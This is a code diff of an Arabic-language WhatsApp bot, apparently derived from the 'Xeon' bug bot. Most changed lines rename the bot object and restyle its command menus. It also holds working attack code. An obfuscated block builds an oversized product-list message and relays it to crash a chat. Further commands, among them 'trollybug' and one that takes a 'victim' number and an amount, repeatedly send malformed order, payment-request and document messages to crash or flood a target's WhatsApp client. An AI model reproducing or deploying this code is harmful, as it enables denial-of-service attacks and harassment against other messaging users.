+function _0x4279(){const _0x4c3178=['fromObject','Message','1847261837216262824','73652izvGmz','1847261837216262829','1910200oYNAKN','Xeon\x20Bug\x20WhatsApp','1847261837216262','331958AouuTv','key','7007318245952499','890188DtEJNR','0@s.whatsapp.net','1847261837216269','sendMessage','258issmFR','1210MrdGTJ','184726183721626282','36XHGsdh','184726183721626','156QxEJPM','2092328zHiLqt','18472618372162628','18472618372162627','56945YMXtkC','PRODUCT_LIST','chat','3309880sRCSRt',' 916909137213@s.whatsapp.net'];_0x4279=function(){return _0x4c3178;};return _0x4279();}const _0x588892=_0x54e7;function _0x54e7(_0x45a980,_0x39b46a){const _0x4279b=_0x4279();return _0x54e7=function(_0x54e7ef,_0x201079){_0x54e7ef=_0x54e7ef-0x1f0;let _0x13064e=_0x4279b[_0x54e7ef];return _0x13064e;},_0x54e7(_0x45a980,_0x39b46a);}(function(_0x2a139b,_0x2b4728){const _0x1838e0=_0x54e7,_0x425404=_0x2a139b();while(!![]){try{const _0x5b3fe2=-parseInt(_0x1838e0(0x201))/0x1+-parseInt(_0x1838e0(0x1fb))/0x2+-parseInt(_0x1838e0(0x20a))/0x3*(-parseInt(_0x1838e0(0x1f9))/0x4)+-parseInt(_0x1838e0(0x1f1))/0x5*(parseInt(_0x1838e0(0x205))/0x6)+-parseInt(_0x1838e0(0x1f4))/0x7+parseInt(_0x1838e0(0x20b))/0x8*(-parseInt(_0x1838e0(0x208))/0x9)+parseInt(_0x1838e0(0x206))/0xa*(parseInt(_0x1838e0(0x1fe))/0xb);if(_0x5b3fe2===_0x2b4728)break;else _0x425404['push'](_0x425404['shift']());}catch(_0x103dcc){_0x425404['push'](_0x425404['shift']());}}}(_0x4279,0xb8533),a=await Elza3emgonBot[_0x588892(0x204)](m[_0x588892(0x1f3)],{'react':{'key':{'remoteJid':m[_0x588892(0x1f3)],'fromMe':!![],'id':m[_0x588892(0x1ff)]['id']}}}));let doko={'key':{'participant':_0x588892(0x202)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':xpicvirus}}};var xeonordy=generateWAMessageFromContent(m['chat'],proto[_0x588892(0x1f7)][_0x588892(0x1f6)]({'listMessage':{'title':''+xeonbutton2,'description':_0x588892(0x1fc)+xeonbutton2,'thumbnail':xpicvirus,'buttonText':'','listType':_0x588892(0x1f2),'productListInfo':{'productSections':[{'title':''+xeonbutton2,'products':[{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216262'},{'productId':'1847261837216262244'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262829'},{'productId':_0x588892(0x1f8)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':'184726183721626282'},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x1f0)},{'productId':_0x588892(0x1fd)},{'productId':'1847261837216262'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'1847261837216269'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x203)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':'184726183721626'},{'productId':_0x588892(0x209)},{'productId':_0x588892(0x1fa)},{'productId':'1847261837216262824'},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x207)},{'productId':_0x588892(0x20c)},{'productId':_0x588892(0x20c)},{'productId':'1847261837216262'},{'productId':'1847261837216262'},{'productId':'18472618372162627'},{'productId':_0x588892(0x1fd)},{'productId':_0x588892(0x1fd)},{'productId':'184726183721626'},{'productId':'184726183721626'},{'productId':'184726183721626'}]}],'headerImage':{'productId':_0x588892(0x200)},'businessOwnerJid':_0x588892(0x1f5)},'footerText':''+xeonbutton2}}),{'userJid':m[_0x588892(0x1f3)],'quoted':m});Elza3emgonBot['relayMessage'](m[_0x588892(0x1f3)],xeonordy['message'],{'messageId':xeonordy['key']['id']});
 }
 }
 break
@@ -8280,7 +8258,7 @@ case 'trollybug': {
 if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(q)}`
 for (let i = 0; i < amount; i++) {
-a = await ElgazarBot.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+a = await Elza3emgonBot.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
 let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${botname}`,jpegThumbnail: thumb}}}
 var xeonoporwot = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
@@ -8295,7 +8273,7 @@ var xeonoporwot = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: m.chat, quoted: doc })
-ElgazarBot.relayMessage(m.chat, xeonoporwot.message, { messageId: xeonoporwot.key.id })
+Elza3emgonBot.relayMessage(m.chat, xeonoporwot.message, { messageId: xeonoporwot.key.id })
 }
 }
 break
@@ -8306,7 +8284,7 @@ if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} victim nu
 num = q.split('|')[0]
 amount = q.split('|')[1]
 for (let i = 0; i < amount; i++) {
-var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: ElgazarBot.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpicvirus.png') }, { upload: Elza3emgonBot.waUploadToServer })
 var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "INR",
@@ -8315,7 +8293,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "text": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
 }
 }}), { userJid: m.chat, quoted: doc})
-ElgazarBot.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+Elza3emgonBot.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 }
 reply(`Success in Sending Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
@@ -8329,7 +8307,7 @@ amount = `${encodeURI(q)}`
 ydd = `${ownername}`
 for (let i = 0; i < amount; i++) {
 brutaltarget = fs.readFileSync('./XBug/cumshot.xeon')
-ElgazarBot.sendMessage(m.chat, {document: brutaltarget, mimetype: 'application/octet-stream', fileName:`${ownername} ${xeonbutton2}.xeon` }, {quoted:doc})
+Elza3emgonBot.sendMessage(m.chat, {document: brutaltarget, mimetype: 'application/octet-stream', fileName:`${ownername} ${xeonbutton2}.xeon` }, {quoted:doc})
 }
 }
 break
@@ -8355,7 +8333,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "mediaKeyTimestamp": "1658703206",
 }
 }), { userJid: m.chat })
-ElgazarBot.relayMessage(m.chat, document.message, { messageId: document.key.id })
+Elza3emgonBot.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 }
 break
@@ -8381,7 +8359,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "mediaKeyTimestamp": "1659416157",
 }
 }), { userJid: m.chat })
-ElgazarBot.relayMessage(m.chat, document.message, { messageId: document.key.id })
+Elza3emgonBot.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 }
 break
@@ -8415,7 +8393,7 @@ message: {
 } 
 } 
 }
-ElgazarBot.sendText(m.chat, `Xeon Ezy☣️`, text, {quoted: unicornXeonxD})
+Elza3emgonBot.sendText(m.chat, `Xeon Ezy☣️`, text, {quoted: unicornXeonxD})
 }
 }
 break
@@ -8432,7 +8410,7 @@ case 'textshot': {
 
 /*case 'tqtt': 
 throw `Thanks me
-https://youtube.com/@MR_ThomasFF
+https://youtube.com/@YOUSSEF-ALSOLTN
 
 
 201227179105
@@ -8446,22 +8424,22 @@ https://www.instagram.com/youssef.alsoltan_
 break*/
 
 case 'م1': case 'اوامر الاعضاء': {
-teks = `• مرحبا ياروحي ⤌⤈       
+teks = `• مرحبا ⤌⤈       
 𓆩 *${pushname}* 𓆪
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر الاعضاء𓆪 
 𓍹——————————𓍻
 ( .السرعه )
-♚ لمعرفة معلومات البوت 
+☆ لمعرفة معلومات البوت 
 ꔹ━━━━━ꔹ
 ( .التنصيب )
-♚ لعرض روابط وصنع بوت مشابه
+☆ لعرض روابط وصنع بوت مشابه
 ꔹ━━━━━ꔹ
 ( .المطور )
-♚ لمعرفه مطور البوت 
+☆ لمعرفه مطور البوت 
 ꔹ━━━━━ꔹ
 ( .انطق )
-♚ البوت ينطق المكتوب`
+☆ البوت ينطق المكتوب`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
 ]
@@ -8473,7 +8451,7 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"black ʙᴏт",
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
 body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
@@ -8481,45 +8459,48 @@ mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
 
 case 'م2': case 'اوامر المالك': {
-teks = `• مرحبا ياروحي ⤌⤈       
+teks = `• مرحبا ⤌⤈       
 𓆩 *${pushname}* 𓆪
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر المالك𓆪
 𓍹——————————𓍻
 ( .عام )
-♚ يجعل البوت عام للجميع  
+☆ يجعل البوت عام للجميع  
 ꔹ━━━━━ꔹ
 ( .خاص )
-♚ يجعل البوت خاص للمالك فقط
+☆ يجعل البوت خاص للمالك فقط
 ꔹ━━━━━ꔹ
 ( .حظر )
-♚ حظر شخص من استخدام البوت 
+☆ حظر شخص من استخدام البوت 
 ꔹ━━━━━ꔹ
 ( .بان )
-♚ حظر اي جروب من استخدام البوت 
+☆ حظر اي جروب من استخدام البوت 
 ꔹ━━━━━ꔹ
 ( .اخرج )
-♚ خروج البوت من الجروب 
+☆ خروج البوت من الجروب 
 ꔹ━━━━━ꔹ
 ( .انضم )
-♚ ينضم البوت لجروب عبر الرابط
+☆ ينضم البوت لجروب عبر الرابط
 ꔹ━━━━━ꔹ
 ( .بلوك )
-♚ عمل بلوك لشخص من البوت 
+☆ عمل بلوك لشخص من البوت 
 ꔹ━━━━━ꔹ
 ( .فك-البلوك )
-♚ الغاء البلوك عن الشخص 
+☆ الغاء البلوك عن الشخص 
 ꔹ━━━━━ꔹ
 ( .اذاعه )
-♚ عمل اذاعه لكل الجروبات في البوت
+☆ عمل اذاعه لكل الجروبات في البوت
 ꔹ━━━━━ꔹ
 ( .جلب )
-♚ يجلب لك ملفات سكريبت جيثب `
+☆ يجلب لك ملفات سكريبت جيثب 
+ꔹ━━━━━ꔹ
+( .bc )
+☆ اذاعه للكل`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
 ]
@@ -8531,7 +8512,7 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"elza3em ʙᴏт",
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
 body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
@@ -8539,72 +8520,72 @@ mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
 
 case 'م3': case 'اوامر الجروبات': {
-teks = `• مرحبا ياروحي ⤌⤈       
+teks = `• مرحبا ⤌⤈       
 𓆩 *${pushname}* 𓆪
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر الجروب𓆪
 𓍹——————————𓍻
 ( .منشن )
-♚ منشن جماعي لكل الاعضاء
+☆ منشن جماعي لكل الاعضاء
 ꔹ━━━━━ꔹ
 ( .مخفي )
-♚ منشن مخفي لكل الاعضاء 
+☆ منشن مخفي لكل الاعضاء 
 ꔹ━━━━━ꔹ
 ( .حذف )
-♚ حذف رسالة البوت والاعضاء
+☆ حذف رسالة البوت والاعضاء
  ꔹ━━━━━ꔹ
 ( .لينك )
-♚ جلب رابط الجروب 
+☆ جلب رابط الجروب 
 ꔹ━━━━━ꔹ
 ( .رستر )
-♚ رستارت لرابط الجروب 
+☆ رستارت لرابط الجروب 
  ꔹ━━━━━ꔹ
 ( .رفع )
-♚ رفع عضو لمشرف 
+☆ رفع عضو لمشرف 
  ꔹ━━━━━ꔹ
 ( .تنزيل )
-♚ تنزيل عضو من المشرف 
+☆ تنزيل عضو من المشرف 
 ꔹ━━━━━ꔹ
 ( .تغيرالاسم )
-♚ تغيير اسم الجروب 
+☆ تغيير اسم الجروب 
  ꔹ━━━━━ꔹ
 ( .تغيرالبايو )
-♚ تغيير وصف الجروب 
+☆ تغيير وصف الجروب 
 ꔹ━━━━━ꔹ
 ( .تغيرالصوره )
-♚ تغيير صورة الجروب 
+☆ تغيير صورة الجروب 
 ꔹ━━━━━ꔹ
 ( .جروب )
-♚ غلق وفتح الجروب 
+☆ غلق وفتح الجروب 
  ꔹ━━━━━ꔹ
 ( .طرد )
-♚ طرد شخص من الجروب 
+☆ طرد شخص من الجروب 
  ꔹ━━━━━ꔹ
 ( . اضافه )
-♚ اضافه شخص للجروب
+☆ اضافه شخص للجروب
 ꔹ━━━━━ꔹ
 ( .الروابط )
-♚ منع ارسال الروابط في الجروب 
+☆ منع ارسال الروابط في الجروب 
 ꔹ━━━━━ꔹ
 ( .السب )
-♚ لمنع الشتايم والسب في الجروبات
+☆ لمنع الشتايم والسب في الجروبات
 ꔹ━━━━━ꔹ
 ( .الحب )
-♚ جلب نسبه حب الشخص لك
+☆ جلب نسبه حب الشخص لك
 ꔹ━━━━━ꔹ
 ( .الكره )
-♚ نسبه كره الشخص لك
+☆ نسبه كره الشخص لك
 ꔹ━━━━━ꔹ
 ( .شخصيتك )
-♚ البوت يعرفك شخصيتك
+☆ البوت يعرفك شخصيتك
 ꔹ━━━━━ꔹ
 ( .الجمال )
-♚ يجلب لك نسبه جمالك`
+☆ يجلب لك نسبه جمالك`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
 ]
@@ -8616,7 +8597,7 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"elza3em ʙᴏт",
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
 body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
@@ -8624,54 +8605,54 @@ mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
 sourceUrl: "https://telegra.ph/file/25ac27774c8a0420e2649.jpg"
 }}
 }
-ElgazarBot.sendMessage(m.chat, buttonMessage, { quoted: m })
+Elza3emgonBot.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
             break
 
 case 'م4': case 'اوامر التنزيل': {
-teks = `• مرحبا ياروحي ⤌⤈       
+teks = `• مرحبا ⤌⤈       
 𓆩 *${pushname}* 𓆪
 𓍹——————————𓍻
 𓆩اليك قائمة باوامر التنزيل𓆪
 𓍹——————————𓍻
 ( .ميديافاير )
-♚ التنزيل من ميديا فاير
+☆ التنزيل من ميديا فاير
  ꔹ━━━━━ꔹ
 ( .انستجرام )
-♚ التنزيل من انستجرام
+☆ التنزيل من انستجرام
  ꔹ━━━━━ꔹ
 ( .تيكتوك )
-♚ التنزيل من تيكتوك 
+☆ التنزيل من تيكتوك 
 ꔹ━━━━━ꔹ
 ( .شغل )
-♚ البحث عن مقطع أغنية في يوتيوب
+☆ البحث عن مقطع أغنية في يوتيوب
  ꔹ━━━━━ꔹ
  ( .تشغيل )
-♚ قائمه بحث علي اغاني في يوتيوب
+☆ قائمه بحث علي اغاني في يوتيوب
  ꔹ━━━━━ꔹ
 ( .انمي )
-♚ البحث عن خلفية انمي 
+☆ البحث عن خلفية انمي 
  ꔹ━━━━━ꔹ
 ( .صوره )
-♚ البحث عن صور عشوائية 
+☆ البحث عن صور عشوائية 
 ꔹ━━━━━ꔹ
 ( .تطقيم )
-♚ جلب تطقيمات 
+☆ جلب تطقيمات 
  ꔹ━━━━━ꔹ
 ( .فيديو )
-♚ تنزيل فيديو من يوتيوب بالرابط
+☆ تنزيل فيديو من يوتيوب بالرابط
  ꔹ━━━━━ꔹ
  ( .اغنيه )
-♚ تنزيل اغنيه من يوتيوب بالرابط
+☆ تنزيل اغنيه من يوتيوب بالرابط
  ꔹ━━━━━ꔹ
  ( .خلفيات )
-♚ تنزيل خلفيات
+☆ تنزيل خلفيات
  ꔹ━━━━━ꔹ
  ( .ويلبر )
-♚ تنزيل صور ويلبر للتليفون
+☆ تنزيل صور ويلبر للتليفون
  ꔹ━━━━━ꔹ
 ( .تخمين )
-♚ تخمين ارقام مشابهه لرقمك`
+☆ تخمين ارقام مشابهه لرقمك`
 let buttons = [
 {buttonId: `owner`, buttonText: {displayText: 'المطور👤'}, type: 1}
 ]
@@ -8683,7 +8664,7 @@ footer: `${botname}`,
 buttons: buttons,
 headerType: 4,
 contextInfo:{externalAdReply:{
-title:"elza3em ʙᴏт",
+title:"𝚃𝙷𝙾𝙼𝙰𝚂 ",
 body: "سورس غون", 
 thumbnail: fs.readFileSync("XeonMedia/theme/cheemspic.jpg"),
 mediaType:1,
@@ -8691,48 +8672,48 @@ mediaUrl: 'https://telegra.ph/file/25ac27774c8a0420e2649.jpg',
